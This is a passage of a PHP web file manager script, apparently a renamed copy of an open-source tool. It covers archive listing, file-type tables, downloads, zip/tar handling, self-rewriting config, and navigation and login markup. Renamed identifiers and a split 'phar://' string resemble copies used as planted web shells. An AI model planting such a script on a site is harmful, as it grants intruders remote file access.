                    'compressed_size' => @zip_entry_compressedsize($zip_entry),
                    'folder' => $zip_folder
                );
            }
            @zip_close($arch);
            return $filenames;
        }
    } elseif($ext == 'tar' and class_exists('PharData')) {
        $archive = new PharData($path);
        $filenames = array();
        foreach(new RecursiveIteratorIterator($archive) as $file) {
            $parent_info = $file->getPathInfo();
            $zip_name = str_replace("ph" . "ar://".$path, '', $file->getPathName());
            $zip_name = substr($zip_name, ($pos = strpos($zip_name, '/')) !== false ? $pos + 1 : 0);
            $zip_folder = $parent_info->getFileName();
            $zip_info = new SplFileInfo($file);
            $filenames[] = array(
                'name' => $zip_name,
                'filesize' => $zip_info->getSize(),
                'compressed_size' => $file->getCompressedSize(),
                'folder' => $zip_folder
            );
        }
        return $filenames;
    }
    return false;
}


function fanco($text)
{
    return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
}

function fm_isvalid_filename($text) {
    return (strpbrk($text, '/?%*:|"<>') === FALSE) ? true : false;
}


function fm_set_msg($msg, $status = 'ok')
{
    $_SESSION[DN_CESSION_ID]['message'] = $msg;
    $_SESSION[DN_CESSION_ID]['status'] = $status;
}


function fm_is_utf8($string)
{
    return preg_match('//u', $string);
}


function fm_convert_win($filename)
{
    if (FM_IS_WIN and function_exists('iconv')) {
        $filename = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $filename);
    }
    return $filename;
}


function fm_object_to_array($obj)
{
    if (!is_object($obj) and !is_array($obj)) {
        return $obj;
    }
    if (is_object($obj)) {
        $obj = get_object_vars($obj);
    }
    return array_map('fm_object_to_array', $obj);
}


function fm_get_file_icon_class($path)
{
    // get extension
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));

    switch ($ext) {
        case 'ico':
        case 'gif':
        case 'jpg':
        case 'jpeg':
        case 'jpc':
        case 'jp2':
        case 'jpx':
        case 'xbm':
        case 'wbmp':
        case 'png':
        case 'bmp':
        case 'tif':
        case 'tiff':
        case 'webp':
        case 'avif':
        case 'svg':
            $img = 'fa fa-picture-o';
            break;
        case 'passwd':
        case 'ftpquota':
        case 'sql':
        case 'js':
        case 'ts':
        case 'jsx':
        case 'tsx':
        case 'hbs':
        case 'json':
        case 'sh':
        case 'config':
        case 'twig':
        case 'tpl':
        case 'md':
        case 'gitignore':
        case 'c':
        case 'cpp':
        case 'cs':
        case 'py':
        case 'rs':
        case 'map':
        case 'lock':
        case 'dtd':
            $img = 'fa fa-file-code-o';
            break;
        case 'txt':
        case 'ini':
        case 'conf':
        case 'log':
        case 'htaccess':
        case 'yaml':
        case 'yml':
        case 'toml':
        case 'tmp':
        case 'top':
        case 'bot':
        case 'dat':
        case 'bak':
        case 'htpasswd':
        case 'pl':
            $img = 'fa fa-file-text-o';
            break;
        case 'css':
        case 'less':
        case 'sass':
        case 'scss':
            $img = 'fa fa-css3';
            break;
        case 'bz2':
        case 'tbz2':
        case 'tbz':
        case 'zip':
        case 'rar':
        case 'gz':
        case 'tgz':
        case 'tar':
        case '7z':
        case 'xz':
        case 'txz':
        case 'zst':
        case 'tzst':
            $img = 'fa fa-file-archive-o';
            break;
        case 'php':
        case 'php4':
        case 'php5':
        case 'phps':
        case 'phtml':
            $img = 'fa fa-code';
            break;
        case 'htm':
        case 'html':
        case 'shtml':
        case 'xhtml':
            $img = 'fa fa-html5';
            break;
        case 'xml':
        case 'xsl':
            $img = 'fa fa-file-excel-o';
            break;
        case 'wav':
        case 'mp3':
        case 'mp2':
        case 'm4a':
        case 'aac':
        case 'ogg':
        case 'oga':
        case 'wma':
        case 'mka':
        case 'flac':
        case 'ac3':
        case 'tds':
            $img = 'fa fa-music';
            break;
        case 'm3u':
        case 'm3u8':
        case 'pls':
        case 'cue':
        case 'xspf':
            $img = 'fa fa-headphones';
            break;
        case 'avi':
        case 'mpg':
        case 'mpeg':
        case 'mp4':
        case 'm4v':
        case 'flv':
        case 'f4v':
        case 'ogm':
        case 'ogv':
        case 'mov':
        case 'mkv':
        case '3gp':
        case 'asf':
        case 'wmv':
        case 'webm':
            $img = 'fa fa-file-video-o';
            break;
        case 'eml':
        case 'msg':
            $img = 'fa fa-envelope-o';
            break;
        case 'xls':
        case 'xlsx':
        case 'ods':
            $img = 'fa fa-file-excel-o';
            break;
        case 'csv':
            $img = 'fa fa-file-text-o';
            break;
        case 'bak':
        case 'swp':
            $img = 'fa fa-clipboard';
            break;
        case 'doc':
        case 'docx':
        case 'odt':
            $img = 'fa fa-file-word-o';
            break;
        case 'ppt':
        case 'pptx':
            $img = 'fa fa-file-powerpoint-o';
            break;
        case 'ttf':
        case 'ttc':
        case 'otf':
        case 'woff':
        case 'woff2':
        case 'eot':
        case 'fon':
            $img = 'fa fa-font';
            break;
        case 'pdf':
            $img = 'fa fa-file-pdf-o';
            break;
        case 'psd':
        case 'ai':
        case 'eps':
        case 'fla':
        case 'swf':
            $img = 'fa fa-file-image-o';
            break;
        case 'exe':
        case 'msi':
            $img = 'fa fa-file-o';
            break;
        case 'bat':
            $img = 'fa fa-terminal';
            break;
        default:
            $img = 'fa fa-info-circle';
    }

    return $img;
}


function fm_get_image_exts()
{
    return array('ico', 'gif', 'jpg', 'jpeg', 'jpc', 'jp2', 'jpx', 'xbm', 'wbmp', 'png', 'bmp', 'tif', 'tiff', 'psd', 'svg', 'webp', 'avif');
}


function fm_get_video_exts()
{
    return array('avi', 'webm', 'wmv', 'mp4', 'm4v', 'ogm', 'ogv', 'mov', 'mkv');
}


function fm_get_audio_exts()
{
    return array('wav', 'mp3', 'ogg', 'm4a');
}


function fm_get_text_exts()
{
    return array(
        'txt', 'css', 'ini', 'conf', 'log', 'htaccess', 'passwd', 'ftpquota', 'sql', 'js', 'ts', 'jsx', 'tsx', 'mjs', 'json', 'sh', 'config',
        'php', 'php4', 'php5', 'phps', 'phtml', 'htm', 'html', 'shtml', 'xhtml', 'xml', 'xsl', 'm3u', 'm3u8', 'pls', 'cue', 'bash', 'vue',
        'eml', 'msg', 'csv', 'bat', 'twig', 'tpl', 'md', 'gitignore', 'less', 'sass', 'scss', 'c', 'cpp', 'cs', 'py', 'go', 'zsh', 'swift',
        'map', 'lock', 'dtd', 'svg', 'asp', 'aspx', 'asx', 'asmx', 'ashx', 'jsp', 'jspx', 'cgi', 'dockerfile', 'ruby', 'yml', 'yaml', 'toml',
        'vhost', 'scpt', 'applescript', 'csx', 'cshtml', 'c++', 'coffee', 'cfm', 'rb', 'graphql', 'mustache', 'jinja', 'http', 'handlebars',
        'java', 'es', 'es6', 'markdown', 'wiki', 'tmp', 'top', 'bot', 'dat', 'bak', 'htpasswd', 'pl'
    );
}


function fm_get_text_mimes()
{
    return array(
        'application/xml',
        'application/javascript',
        'application/x-javascript',
        'image/svg+xml',
        'message/rfc822',
        'application/json',
    );
}


function fm_get_text_names()
{
    return array(
        'license',
        'readme',
        'authors',
        'contributors',
        'changelog',
    );
}


function fm_get_onlineViewer_exts()
{
    return array('doc', 'docx', 'xls', 'xlsx', 'pdf', 'ppt', 'pptx', 'ai', 'psd', 'dxf', 'xps', 'rar', 'odt', 'ods');
}

function fm_get_file_mimes($extension)
{
    $fileTypes['swf'] = 'application/x-shockwave-flash';
    $fileTypes['pdf'] = 'application/pdf';
    $fileTypes['exe'] = 'application/octet-stream';
    $fileTypes['zip'] = 'application/zip';
    $fileTypes['doc'] = 'application/msword';
    $fileTypes['xls'] = 'application/vnd.ms-excel';
    $fileTypes['ppt'] = 'application/vnd.ms-powerpoint';
    $fileTypes['gif'] = 'image/gif';
    $fileTypes['png'] = 'image/png';
    $fileTypes['jpeg'] = 'image/jpg';
    $fileTypes['jpg'] = 'image/jpg';
    $fileTypes['webp'] = 'image/webp';
    $fileTypes['avif'] = 'image/avif';
    $fileTypes['rar'] = 'application/rar';

    $fileTypes['ra'] = 'audio/x-pn-realaudio';
    $fileTypes['ram'] = 'audio/x-pn-realaudio';
    $fileTypes['ogg'] = 'audio/x-pn-realaudio';

    $fileTypes['wav'] = 'video/x-msvideo';
    $fileTypes['wmv'] = 'video/x-msvideo';
    $fileTypes['avi'] = 'video/x-msvideo';
    $fileTypes['asf'] = 'video/x-msvideo';
    $fileTypes['divx'] = 'video/x-msvideo';

    $fileTypes['mp3'] = 'audio/mpeg';
    $fileTypes['mp4'] = 'audio/mpeg';
    $fileTypes['mpeg'] = 'video/mpeg';
    $fileTypes['mpg'] = 'video/mpeg';
    $fileTypes['mpe'] = 'video/mpeg';
    $fileTypes['mov'] = 'video/quicktime';
    $fileTypes['swf'] = 'video/quicktime';
    $fileTypes['3gp'] = 'video/quicktime';
    $fileTypes['m4a'] = 'video/quicktime';
    $fileTypes['aac'] = 'video/quicktime';
    $fileTypes['m3u'] = 'video/quicktime';

    $fileTypes['php'] = ['application/x-php'];
    $fileTypes['html'] = ['text/html'];
    $fileTypes['txt'] = ['text/plain'];
    //Unknown mime-types should be 'application/octet-stream'
    if(empty($fileTypes[$extension])) {
      $fileTypes[$extension] = ['application/octet-stream'];
    }
    return $fileTypes[$extension];
}


 function scan($dir = '', $filter = '') {
    $path = FM_ROOT_PATH.'/'.$dir;
     if($path) {
         $ite = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path));
         $rii = new RegexIterator($ite, "/(" . $filter . ")/i");

         $files = array();
         foreach ($rii as $file) {
             if (!$file->isDir()) {
                 $fileName = $file->getFilename();
                 $location = str_replace(FM_ROOT_PATH, '', $file->getPath());
                 $files[] = array(
                     "name" => $fileName,
                     "type" => "file",
                     "path" => $location,
                 );
             }
         }
         return $files;
     }
}


function fm_download_file($fileLocation, $fileName, $chunkSize  = 1024)
{
    if (connection_status() != 0)
        return (false);
    $extension = pathinfo($fileName, PATHINFO_EXTENSION);

    $contentType = fm_get_file_mimes($extension);

    $size = filesize($fileLocation);

    if ($size == 0) {
        fm_set_msg(lng('Zero byte file! Aborting download'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));

        return (false);
    }

    @ini_set('magic_quotes_runtime', 0);
    $fp = fopen("$fileLocation", "rb");

    if ($fp === false) {
        fm_set_msg(lng('Cannot open file! Aborting download'), 'error');
        $FM_PATH=FM_PATH; fm_redirect(FM_SELF_URL . '?p=' . urlencode($FM_PATH));
        return (false);
    }

    // headers
    header('Content-Description: File Transfer');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header("Content-Transfer-Encoding: binary");
    header("Content-Type: $contentType");

    $contentDisposition = 'attachment';

    if (strstr($_SERVER['HTTP_USER_AGENT'], "MSIE")) {
        $fileName = preg_replace('/\./', '%2e', $fileName, substr_count($fileName, '.') - 1);
        header("Content-Disposition: $contentDisposition;filename=\"$fileName\"");
    } else {
        header("Content-Disposition: $contentDisposition;filename=\"$fileName\"");
    }

    header("Accept-Ranges: bytes");
    $range = 0;

    if (isset($_SERVER['HTTP_RANGE'])) {
        list($a, $range) = explode("=", $_SERVER['HTTP_RANGE']);
        str_replace($range, "-", $range);
        $size2 = $size - 1;
        $new_length = $size - $range;
        header("HTTP/1.1 206 Partial Content");
        header("Content-Length: $new_length");
        header("Content-Range: bytes $range$size2/$size");
    } else {
        $size2 = $size - 1;
        header("Content-Range: bytes 0-$size2/$size");
        header("Content-Length: " . $size);
    }
    $fileLocation = realpath($fileLocation);
    while (ob_get_level()) ob_end_clean();
    readfile($fileLocation);

    fclose($fp);

    return ((connection_status() == 0) and !connection_aborted());
}

function fm_get_theme() {
    $result = '';
    if(FM_THEME == "dark") {
        $result = "text-white bg-dark";
    }
    return $result;
}

class FM_Zipper
{
    private $zip;

    public function __construct()
    {
        $this->zip = new ZipArchive();
    }

    public function create($filename, $files)
    {
        $res = $this->zip->open($filename, ZipArchive::CREATE);
        if ($res !== true) {
            return false;
        }
        if (is_array($files)) {
            foreach ($files as $f) {
                $f = fm_clean_path($f);
                if (!$this->addFileOrDir($f)) {
                    $this->zip->close();
                    return false;
                }
            }
            $this->zip->close();
            return true;
        } else {
            if ($this->addFileOrDir($files)) {
                $this->zip->close();
                return true;
            }
            return false;
        }
    }


    public function unzip($filename, $path)
    {
        $res = $this->zip->open($filename);
        if ($res !== true) {
            return false;
        }
        if ($this->zip->extractTo($path)) {
            $this->zip->close();
            return true;
        }
        return false;
    }


    private function addFileOrDir($filename)
    {
        if (is_file($filename)) {
            return $this->zip->addFile($filename);
        } elseif (is_dir($filename)) {
            return $this->addDir($filename);
        }
        return false;
    }


    private function addDir($path)
    {
        if (!$this->zip->addEmptyDir($path)) {
            return false;
        }
        $objects = scandir($path);
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' and $file != '..') {
                    if (is_dir($path . '/' . $file)) {
                        if (!$this->addDir($path . '/' . $file)) {
                            return false;
                        }
                    } elseif (is_file($path . '/' . $file)) {
                        if (!$this->zip->addFile($path . '/' . $file)) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}


class FM_Zipper_Tar
{
    private $tar;

    public function __construct()
    {
        $this->tar = null;
    }


    public function create($filename, $files)
    {
        $this->tar = new PharData($filename);
        if (is_array($files)) {
            foreach ($files as $f) {
                $f = fm_clean_path($f);
                if (!$this->addFileOrDir($f)) {
                    return false;
                }
            }
            return true;
        } else {
            if ($this->addFileOrDir($files)) {
                return true;
            }
            return false;
        }
    }


    public function unzip($filename, $path)
    {
        $res = $this->tar->open($filename);
        if ($res !== true) {
            return false;
        }
        if ($this->tar->extractTo($path)) {
            return true;
        }
        return false;
    }

    /**
     * Add file/folder to archive
     * @param string $filename
     * @return bool
     */
    private function addFileOrDir($filename)
    {
        if (is_file($filename)) {
            try {
                $this->tar->addFile($filename);
                return true;
            } catch (Exception $e) {
                return false;
            }
        } elseif (is_dir($filename)) {
            return $this->addDir($filename);
        }
        return false;
    }


    private function addDir($path)
    {
        $objects = scandir($path);
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' and $file != '..') {
                    if (is_dir($path . '/' . $file)) {
                        if (!$this->addDir($path . '/' . $file)) {
                            return false;
                        }
                    } elseif (is_file($path . '/' . $file)) {
                        try {
                            $this->tar->addFile($path . '/' . $file);
                        } catch (Exception $e) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}


 class FM_Config
{
     var $data;

    function __construct()
    {
        global $root_path, $root_url, $CONFIG;
        $fm_url = $root_url.$_SERVER["PHP_SELF"];
        $this->data = array(
            'lang' => 'en',
            'error_reporting' => true,
            'show_hidden' => true
        );
        $data = false;
        if (strlen($CONFIG)) {
            $data = fm_object_to_array(json_decode($CONFIG));
        } else {
            $msg = 'gilour<br>Error: Cannot load configuration';
            if (substr($fm_url, -1) == '/') {
                $fm_url = rtrim($fm_url, '/');
                $msg .= '<br>';
                $msg .= '<br>Seems like you have a trailing slash on the URL.';
                $msg .= '<br>Try this link: <a href="' . $fm_url . '">' . $fm_url . '</a>';
            }
            die($msg);
        }
        if (is_array($data) and count($data)) $this->data = $data;
        else $this->save();
    }

    function save()
    {
        $fm_file = __FILE__;
        $var_name = '$CONFIG';
        $var_value = var_export(json_encode($this->data), true);
        $config_string = "<?php" . chr(13) . chr(10) . "//Default Configuration".chr(13) . chr(10)."$var_name = $var_value;" . chr(13) . chr(10);
        if (is_writable($fm_file)) {
            $lines = file($fm_file);
            if ($fh = @fopen($fm_file, "w")) {
                @fputs($fh, $config_string, strlen($config_string));
                for ($x = 3; $x < count($lines); $x++) {
                    @fputs($fh, $lines[$x], strlen($lines[$x]));
                }
                @fclose($fh);
            }
        }
    }
}


function fm_show_nav_path($path)
{
    global $lang, $sticky_navbar, $editFile;
    $isStickyNavBar = $sticky_navbar ? 'fixed-top' : '';
    $getTheme = fm_get_theme();
    $getTheme .= " navbar-light";
    if(FM_THEME == "dark") {
        $getTheme .= " navbar-dark";
    } else {
        $getTheme .= " bg-white";
    }
    ?>
    <nav class="navbar navbar-expand-lg <?php echo $getTheme; ?> mb-4 main-nav <?php echo $isStickyNavBar ?>">
        <a class="navbar-brand"> <?php echo lng('AppTitle') ?> </a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">

            <?php
            $path = fm_clean_path($path);
            $root_url = "<a href='?p='><i class='fa fa-home' aria-hidden='true' title='" . FM_ROOT_PATH . "'></i></a>";
            $sep = '<i class="bread-crumb"> / </i>';
            if ($path != '') {
                $exploded = explode('/', $path);
                $count = count($exploded);
                $array = array();
                $parent = '';
                for ($i = 0; $i < $count; $i++) {
                    $parent = trim($parent . '/' . $exploded[$i], '/');
                    $parent_enc = urlencode($parent);
                    $array[] = "<a href='?p={$parent_enc}'>" . fanco(fm_convert_win($exploded[$i])) . "</a>";
                }
                $root_url .= $sep . implode($sep, $array);
            }
            echo '<div class="col-xs-6 col-sm-5">' . $root_url . $editFile . '</div>';
            ?>

            <div class="col-xs-6 col-sm-7">
                <ul class="navbar-nav justify-content-end <?php echo fm_get_theme();  ?>">
                    <li class="nav-item mr-2">
                        <div class="input-group input-group-sm mr-1" style="margin-top:4px;">
                            <input type="text" class="form-control" placeholder="<?php echo lng('Search') ?>" aria-label="<?php echo lng('Search') ?>" aria-describedby="search-addon2" id="search-addon">
                            <div class="input-group-append">
                                <span class="input-group-text brl-0 brr-0" id="search-addon2"><i class="fa fa-search"></i></span>
                            </div>
                            <div class="input-group-append btn-group">
                                <span class="input-group-text dropdown-toggle brl-0" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></span>
                                  <div class="dropdown-menu dropdown-menu-right">
                                    <a class="dropdown-item" href="<?php echo $path2 = $path ? $path : '.'; ?>" id="js-search-modal" data-bs-toggle="modal" data-bs-target="#searchModal"><?php echo lng('Advanced Search') ?></a>
                                  </div>
                            </div>
                        </div>
                    </li>
                    <?php if (!FM_READONLY): ?>
                    <li class="nav-item">
                        <a title="<?php echo lng('Upload') ?>" class="nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i> <?php echo lng('Upload') ?></a>
                    </li>
                    <li class="nav-item">
                        <a title="<?php echo lng('NewItem') ?>" class="nav-link" href="#createNewItem" data-bs-toggle="modal" data-bs-target="#createNewItem"><i class="fa fa-plus-square"></i> <?php echo lng('NewItem') ?></a>
                    </li>
                    <?php endif; ?>
                    <?php if (FM_USE_AUTH): ?>
                    <li class="nav-item avatar dropdown">
                        <a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink-5" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <i class="fa fa-user-circle"></i> <?php if(isset($_SESSION[DN_CESSION_ID]['logged'])) { echo $_SESSION[DN_CESSION_ID]['logged']; } ?></a>
                        <div class="dropdown-menu text-small shadow <?php echo fm_get_theme(); ?>" aria-labelledby="navbarDropdownMenuLink-5">
                            <?php if (!FM_READONLY): ?>
                            <a title="<?php echo lng('Settings') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php echo lng('Settings') ?></a>
                            <?php endif ?>
                            <a title="<?php echo lng('Help') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;help=2"><i class="fa fa-exclamation-circle" aria-hidden="true"></i> <?php echo lng('Help') ?></a>
                            <a title="<?php echo lng('Logout') ?>" class="dropdown-item nav-link" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i> <?php echo lng('Logout') ?></a>
                        </div>
                    </li>
                    <?php else: ?>
                        <?php if (!FM_READONLY): ?>
                            <li class="nav-item">
                                <a title="<?php echo lng('Settings') ?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php echo lng('Settings') ?></a>
                            </li>
                        <?php endif; ?>
                    <?php endif; ?>
                </ul>
            </div>
        </div>
    </nav>
    <?php
}


function fm_show_message()
{
    if (isset($_SESSION[DN_CESSION_ID]['message'])) {
        $class = isset($_SESSION[DN_CESSION_ID]['status']) ? $_SESSION[DN_CESSION_ID]['status'] : 'ok';
        echo '<p class="message ' . $class . '">' . $_SESSION[DN_CESSION_ID]['message'] . '</p>';
        unset($_SESSION[DN_CESSION_ID]['message']);
        unset($_SESSION[DN_CESSION_ID]['status']);
    }
}


function fm_show_header_login()
{
$sprites_ver = '20160315';
header("Content-Type: text/html; charset=utf-8");
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");
header("Pragma: no-cache");

global $lang, $root_url, $favicon_path;
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="gilour">
    <meta name="author" content="CCP Programmers">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($favicon_path) { echo '<link rel="icon" href="'.fanco($favicon_path).'" type="image/png">'; } ?>
    <title><?php echo fanco(APP_TITLE) ?></title>
    <?php print_external('pre-jsdelivr'); ?>
    <?php print_external('css-bootstrap'); ?>
    <style>
        body.fm-login-page{ background-color:#f7f9fb;font-size:14px;background-color:#f7f9fb;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 304 304' width='304' height='304'%3E%3Cpath fill='%23e2e9f1' fill-opacity='0.4' d='M44.1 224a5 5 0 1 1 0 2H0v-2h44.1zm160 48a5 5 0 1 1 0 2H82v-2h122.1zm57.8-46a5 5 0 1 1 0-2H304v2h-42.1zm0 16a5 5 0 1 1 0-2H304v2h-42.1zm6.2-114a5 5 0 1 1 0 2h-86.2a5 5 0 1 1 0-2h86.2zm-256-48a5 5 0 1 1 0 2H0v-2h12.1zm185.8 34a5 5 0 1 1 0-2h86.2a5 5 0 1 1 0 2h-86.2zM258 12.1a5 5 0 1 1-2 0V0h2v12.1zm-64 208a5 5 0 1 1-2 0v-54.2a5 5 0 1 1 2 0v54.2zm48-198.2V80h62v2h-64V21.9a5 5 0 1 1 2 0zm16 16V64h46v2h-48V37.9a5 5 0 1 1 2 0zm-128 96V208h16v12.1a5 5 0 1 1-2 0V210h-16v-76.1a5 5 0 1 1 2 0zm-5.9-21.9a5 5 0 1 1 0 2H114v48H85.9a5 5 0 1 1 0-2H112v-48h12.1zm-6.2 130a5 5 0 1 1 0-2H176v-74.1a5 5 0 1 1 2 0V242h-60.1zm-16-64a5 5 0 1 1 0-2H114v48h10.1a5 5 0 1 1 0 2H112v-48h-10.1zM66 284.1a5 5 0 1 1-2 0V274H50v30h-2v-32h18v12.1zM236.1 176a5 5 0 1 1 0 2H226v94h48v32h-2v-30h-48v-98h12.1zm25.8-30a5 5 0 1 1 0-2H274v44.1a5 5 0 1 1-2 0V146h-10.1zm-64 96a5 5 0 1 1 0-2H208v-80h16v-14h-42.1a5 5 0 1 1 0-2H226v18h-16v80h-12.1zm86.2-210a5 5 0 1 1 0 2H272V0h2v32h10.1zM98 101.9V146H53.9a5 5 0 1 1 0-2H96v-42.1a5 5 0 1 1 2 0zM53.9 34a5 5 0 1 1 0-2H80V0h2v34H53.9zm60.1 3.9V66H82v64H69.9a5 5 0 1 1 0-2H80V64h32V37.9a5 5 0 1 1 2 0zM101.9 82a5 5 0 1 1 0-2H128V37.9a5 5 0 1 1 2 0V82h-28.1zm16-64a5 5 0 1 1 0-2H146v44.1a5 5 0 1 1-2 0V18h-26.1zm102.2 270a5 5 0 1 1 0 2H98v14h-2v-16h124.1zM242 149.9V160h16v34h-16v62h48v48h-2v-46h-48v-66h16v-30h-16v-12.1a5 5 0 1 1 2 0zM53.9 18a5 5 0 1 1 0-2H64V2H48V0h18v18H53.9zm112 32a5 5 0 1 1 0-2H192V0h50v2h-48v48h-28.1zm-48-48a5 5 0 0 1-9.8-2h2.07a3 3 0 1 0 5.66 0H178v34h-18V21.9a5 5 0 1 1 2 0V32h14V2h-58.1zm0 96a5 5 0 1 1 0-2H137l32-32h39V21.9a5 5 0 1 1 2 0V66h-40.17l-32 32H117.9zm28.1 90.1a5 5 0 1 1-2 0v-76.51L175.59 80H224V21.9a5 5 0 1 1 2 0V82h-49.59L146 112.41v75.69zm16 32a5 5 0 1 1-2 0v-99.51L184.59 96H300.1a5 5 0 0 1 3.9-3.9v2.07a3 3 0 0 0 0 5.66v2.07a5 5 0 0 1-3.9-3.9H185.41L162 121.41v98.69zm-144-64a5 5 0 1 1-2 0v-3.51l48-48V48h32V0h2v50H66v55.41l-48 48v2.69zM50 53.9v43.51l-48 48V208h26.1a5 5 0 1 1 0 2H0v-65.41l48-48V53.9a5 5 0 1 1 2 0zm-16 16V89.41l-34 34v-2.82l32-32V69.9a5 5 0 1 1 2 0zM12.1 32a5 5 0 1 1 0 2H9.41L0 43.41V40.6L8.59 32h3.51zm265.8 18a5 5 0 1 1 0-2h18.69l7.41-7.41v2.82L297.41 50H277.9zm-16 160a5 5 0 1 1 0-2H288v-71.41l16-16v2.82l-14 14V210h-28.1zm-208 32a5 5 0 1 1 0-2H64v-22.59L40.59 194H21.9a5 5 0 1 1 0-2H41.41L66 216.59V242H53.9zm150.2 14a5 5 0 1 1 0 2H96v-56.6L56.6 162H37.9a5 5 0 1 1 0-2h19.5L98 200.6V256h106.1zm-150.2 2a5 5 0 1 1 0-2H80v-46.59L48.59 178H21.9a5 5 0 1 1 0-2H49.41L82 208.59V258H53.9zM34 39.8v1.61L9.41 66H0v-2h8.59L32 40.59V0h2v39.8zM2 300.1a5 5 0 0 1 3.9 3.9H3.83A3 3 0 0 0 0 302.17V256h18v48h-2v-46H2v42.1zM34 241v63h-2v-62H0v-2h34v1zM17 18H0v-2h16V0h2v18h-1zm273-2h14v2h-16V0h2v16zm-32 273v15h-2v-14h-14v14h-2v-16h18v1zM0 92.1A5.02 5.02 0 0 1 6 97a5 5 0 0 1-6 4.9v-2.07a3 3 0 1 0 0-5.66V92.1zM80 272h2v32h-2v-32zm37.9 32h-2.07a3 3 0 0 0-5.66 0h-2.07a5 5 0 0 1 9.8 0zM5.9 0A5.02 5.02 0 0 1 0 5.9V3.83A3 3 0 0 0 3.83 0H5.9zm294.2 0h2.07A3 3 0 0 0 304 3.83V5.9a5 5 0 0 1-3.9-5.9zm3.9 300.1v2.07a3 3 0 0 0-1.83 1.83h-2.07a5 5 0 0 1 3.9-3.9zM97 100a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-48 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 96a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-144a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM49 36a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM33 68a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 240a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm80-176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 